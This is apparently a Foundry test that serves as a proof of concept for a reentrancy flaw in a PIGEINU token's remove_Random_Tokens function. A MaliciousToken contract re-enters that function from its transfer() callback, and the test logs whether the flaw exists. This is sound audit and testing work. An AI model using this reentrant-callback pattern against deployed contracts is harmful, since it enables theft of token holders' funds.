// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/PIGEINU.sol";

contract MaliciousToken {
    PIGEINU public token;
    uint public reentrancyCounter;
    mapping(address => uint) public balances;

    constructor(address payable _token) {
        token = PIGEINU(_token);
    }

    function mint(address to, uint amount) public {
        balances[to] += amount;
    }

    function balanceOf(address account) external view returns (uint) {
        return balances[account];
    }

    function transfer(address to, uint256) external returns (bool) {
        if (reentrancyCounter < 3) {
            reentrancyCounter++;
            token.remove_Random_Tokens(address(this), 10);
        }
        return true;
    }
}

contract AtomicityViolationTest is Test {
    PIGEINU public token;
    MaliciousToken public maliciousToken;
    address public constant devWallet = address(0xDEAD);
    address public attacker = makeAddr("attacker");
    address public constant mockedRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public constant mockedFactory = 0x1234567890123456789012345678901234567890;
    address public constant mockedWETH = 0x1111111111111111111111111111111111111111;
    
    function setUp() public {
        // Mock router calls
        vm.mockCall(
            mockedRouter,
            abi.encodeWithSignature("factory()"),
            abi.encode(mockedFactory)
        );
        vm.mockCall(
            mockedRouter,
            abi.encodeWithSignature("WETH()"),
            abi.encode(mockedWETH)
        );
        
        // Mock factory createPair call
        address dummyPair = address(0xabc);
        vm.mockCall(
            mockedFactory,
            abi.encodeWithSignature("createPair(address,address)"),
            abi.encode(dummyPair)
        );
        
        // Deploy token - bypasses mainnet dependency
        token = new PIGEINU();
        
        // Deploy malicious ERC20 token that reenters during transfer
        maliciousToken = new MaliciousToken(payable(address(token)));
        
        // Fund token contract with malicious tokens
        maliciousToken.mint(address(token), 1000 ether);
    }

    function test_removeRandomTokens_reentrancy() public {
        // Verify initial token balance
        assertEq(maliciousToken.balanceOf(address(token)), 1000 ether);
        
        console2.log("--- BEFORE-Trigger ---");
        uint256 reentrancyCounterBefore = maliciousToken.reentrancyCounter();
        console2.log("Reentrancy counter before:", reentrancyCounterBefore);
        
        console2.log("--- Trigger RemoveRandomTokens ---");
        // Attack: trigger reentrant calls during token transfer
        vm.prank(attacker);
        token.remove_Random_Tokens(address(maliciousToken), 100);

        console2.log("--- AFTER-Trigger ---");
        uint256 reentrancyCounterAfter = maliciousToken.reentrancyCounter();
        console2.log("Reentrancy counter after:", reentrancyCounterAfter);

        bool vulnerabilityExploited = reentrancyCounterAfter > reentrancyCounterBefore;
        console2.log("Reentrancy occurred:", vulnerabilityExploited ? "YES, Vulnerability Exists" : "NO, Vulnerability not Exist");

        // Final verdict
        if (vulnerabilityExploited) {
            console2.log("Vulnerability Exists: Reentrancy counter increased from %d to %d", reentrancyCounterBefore, reentrancyCounterAfter);
        } else {
            console2.log("Vulnerability not Exist: Reentrancy counter unchanged at %d", reentrancyCounterAfter);
        }
    }
}